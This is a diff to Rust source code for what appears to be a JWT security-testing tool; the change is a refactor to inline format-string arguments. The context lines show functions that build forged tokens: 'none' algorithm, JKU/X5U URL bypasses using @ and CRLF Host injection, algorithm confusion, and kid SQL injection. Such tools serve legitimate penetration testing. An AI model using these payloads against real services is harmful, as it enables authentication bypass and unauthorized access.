@@ -23,15 +23,14 @@ pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
 
     let header_json = serde_json::to_string(&header)?;
     info!(
-        "Generate {} payload header=\"{}\" payload={}",
-        alg_value, header_json, alg_value
+        "Generate {alg_value} payload header=\"{header_json}\" payload={alg_value}"
     );
 
     // Encode header to base64
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
 
     // Format as JWT (without signature)
-    Ok(format!("{}.{}", encoded_header, claims_part))
+    Ok(format!("{encoded_header}.{claims_part}"))
 }
 
 /// Generate JKU and X5U payloads for URL manipulation attacks
@@ -62,12 +61,11 @@ pub fn generate_url_payload(
 
     let header_json = serde_json::to_string(&header)?;
     info!(
-        "Generate {} + basic payload header=\"{}\" payload={}",
-        key_type, header_json, key_type
+        "Generate {key_type} + basic payload header=\"{header_json}\" payload={key_type}"
     );
 
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-    payloads.push(format!("{}.{}", encoded_header, claims_part));
+    payloads.push(format!("{encoded_header}.{claims_part}"));
 
     // If trust domain is provided, generate bypass payloads
     if let Some(trust_domain) = trust_domain {
@@ -81,15 +79,14 @@ pub fn generate_url_payload(
 
         let header_json = serde_json::to_string(&header)?;
         info!(
-            "Generate {} host validation payload header=\"{}\" payload={}",
-            key_type, header_json, key_type
+            "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
         );
 
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
+        payloads.push(format!("{encoded_header}.{claims_part}"));
 
         // Bypass host validation - @ separator
-        let bypass_at_url = format!("{}://{}@{}", protocol, trust_domain, domain);
+        let bypass_at_url = format!("{protocol}://{trust_domain}@{domain}");
         let header = json!({
             "alg": "hs256",
             key_type: bypass_at_url,
@@ -98,15 +95,14 @@ pub fn generate_url_payload(
 
         let header_json = serde_json::to_string(&header)?;
         info!(
-            "Generate {} host validation payload header=\"{}\" payload={}",
-            key_type, header_json, key_type
+            "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
         );
 
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
+        payloads.push(format!("{encoded_header}.{claims_part}"));
 
         // Host header injection with CRLF
-        let crlf_url = format!("{}://{}%0d0aHost: {}", protocol, trust_domain, domain);
+        let crlf_url = format!("{protocol}://{trust_domain}%0d0aHost: {domain}");
         let header = json!({
             "alg": "hs256",
             key_type: crlf_url,
@@ -115,12 +111,11 @@ pub fn generate_url_payload(
 
         let header_json = serde_json::to_string(&header)?;
         info!(
-            "Generate {} host header injection (w/CRLF) payload header=\"{}\" payload={}",
-            key_type, header_json, key_type
+            "Generate {key_type} host header injection (w/CRLF) payload header=\"{header_json}\" payload={key_type}"
         );
 
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
+        payloads.push(format!("{encoded_header}.{claims_part}"));
     }
 
     Ok(payloads)
@@ -159,7 +154,7 @@ pub fn generate_alg_confusion_payload(
 
     let header_json = serde_json::to_string(&header)?;
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-    payloads.push(format!("{}.{}", encoded_header, claims_part));
+    payloads.push(format!("{encoded_header}.{claims_part}"));
 
     // 2. Using the public key as the HMAC secret
     // This is a simplified example - in practice you'd need to hash the claims with the public key
@@ -207,7 +202,7 @@ pub fn generate_kid_sql_payload(token: &str) -> Result<Vec<String>> {
 
         let header_json = serde_json::to_string(&header)?;
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
+        payloads.push(format!("{encoded_header}.{claims_part}"));
     }
 
     info!("Generated kid SQL injection payloads");
@@ -247,7 +242,7 @@ pub fn generate_x5c_payload(token: &str) -> Result<Vec<String>> {
 
         let header_json = serde_json::to_string(&header)?;
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
+        payloads.push(format!("{encoded_header}.{claims_part}"));
     }
 
     info!("Generated x5c header injection payloads");
@@ -285,7 +280,7 @@ pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
 
         let header_json = serde_json::to_string(&header)?;
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
+        payloads.push(format!("{encoded_header}.{claims_part}"));
     }
 
     info!("Generated cty header manipulation payloads");
